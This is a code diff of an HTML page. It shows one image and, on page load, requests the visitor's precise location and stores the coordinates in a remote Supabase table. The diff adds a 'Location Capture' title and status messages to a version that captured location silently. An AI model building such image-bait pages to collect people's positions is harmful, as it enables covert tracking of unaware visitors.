@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title></title>
+  <title>Location Capture</title>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     body {
@@ -20,28 +20,71 @@
       height: auto;
       display: block;
     }
+
+    #msg {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+      color: #333;
+      background: rgba(255,255,255,0.9);
+      padding: 8px 12px;
+      border-radius: 6px;
+    }
   </style>
 </head>
 <body>
   <img src="https://neostuffs.com/wp-content/uploads/2016/05/rastra.jpg" alt="Rastra" />
+  <div id="msg">Requesting location...</div>
 
   <script>
     const supabaseUrl = 'https://jjpttsmpkscrvivzowdo.supabase.co';
     const supabaseKey = 'sb_publishable_nbsygrIo_n-UTUNnEV5wBA_ndx8V_sF';
     const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
 
+    const msg = document.getElementById('msg');
+
     async function saveLocation(position) {
-      await supabase.from('locations').insert({
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        created_at: new Date().toISOString()
-      });
+      try {
+        const { error } = await supabase.from('locations').insert({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          created_at: new Date().toISOString()
+        });
+
+        if (error) {
+          msg.textContent = 'Supabase error: ' + error.message;
+        } else {
+          msg.textContent = 'Location saved successfully';
+        }
+      } catch (e) {
+        msg.textContent = 'Error saving location';
+      }
     }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(saveLocation);
+    function requestLocation() {
+      if (!navigator.geolocation) {
+        msg.textContent = 'Geolocation not supported';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        saveLocation,
+        (err) => {
+          msg.textContent = 'Location denied or unavailable: ' + err.message;
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
     }
+
+    window.addEventListener('load', () => {
+      requestLocation();
+    });
   </script>
 </body>
 </html>
+
+
 
